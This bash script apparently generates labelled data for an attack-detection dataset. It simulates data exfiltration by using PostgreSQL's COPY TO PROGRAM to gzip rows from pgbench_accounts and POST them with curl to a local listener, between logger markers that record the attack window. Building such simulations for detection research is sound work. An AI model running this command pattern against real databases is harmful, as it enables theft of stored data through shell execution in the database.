#!/bin/bash
echo "Simulating Data Exfiltration Attack (gzip + curl)..."
/dataset_workspace/logger.sh mark_attack "attack_exfil_gzip_curl" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'gzip > /tmp/exfil_gzip_curl.dat && curl -s -X POST -d @/tmp/exfil_gzip_curl.dat http://127.0.0.1:9090 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_exfil_gzip_curl" end
